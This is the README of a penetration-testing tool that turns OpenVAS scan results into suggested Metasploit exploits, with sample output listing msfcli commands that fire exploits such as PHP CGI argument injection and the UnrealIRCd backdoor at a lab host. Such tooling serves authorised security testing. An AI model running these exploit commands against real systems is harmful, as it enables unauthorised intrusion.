Msfsuggester
============

Msfsuggester is a tool that parse OpenVAS XML output and suggest an exploit
form metasploit with a msfcli command line.

Installation
--
```
$ git clone https://github.com/m0nad/msfsuggeter
$ gem install nokogiri
```
Usage
--
```
ruby msfsuggester.rb openvas.xml /path/to/metasploit-framework/
```
Example: 
--
```
$ ruby msfsuggester.rb OPENVAS_metasploitable.xml /home/monad/metasploit-framework/
== (GoodRanking) MySQL yaSSL CertDecoder::GetName Buffer Overflow ==
msfcli exploit/linux/mysql/mysql_yassl_getname RHOST=192.168.0.115 RPORT=3306 E
Refs: CVE:2009-4484 BID:37974

== (ExcellentRanking) PHP CGI Argument Injection ==
msfcli exploit/multi/http/php_cgi_arg_injection RHOST=192.168.0.115 RPORT=80 E
Refs: CVE:2012-1823

== (ExcellentRanking) DistCC Daemon Command Execution ==
msfcli exploit/unix/misc/distcc_exec RHOST=192.168.0.115 RPORT=3632 E
Refs: CVE:2004-2687

== (ExcellentRanking) UnrealIRCD 3.2.8.1 Backdoor Command Execution ==
msfcli exploit/unix/irc/unreal_ircd_3281_backdoor RHOST=192.168.0.115 RPORT=6667 E
Refs: CVE:2010-2075

== (Unknown) OpenSSL Server-Side ChangeCipherSpec Injection Scanner ==
msfcli auxiliary/scanner/ssl/openssl_ccs RHOSTS=192.168.0.115 RPORT=5432 E
Refs: CVE:2014-0224

== (Unknown) HTTP Options Detection ==
msfcli auxiliary/scanner/http/options RHOSTS=192.168.0.115 RPORT=80 E
Refs: CVE:2005-3498 BID:9561

== (Unknown) X11 No-Auth Scanner ==
msfcli auxiliary/scanner/x11/open_x11 RHOSTS=192.168.0.115 RPORT=6000 E
Refs: CVE:1999-0526
```
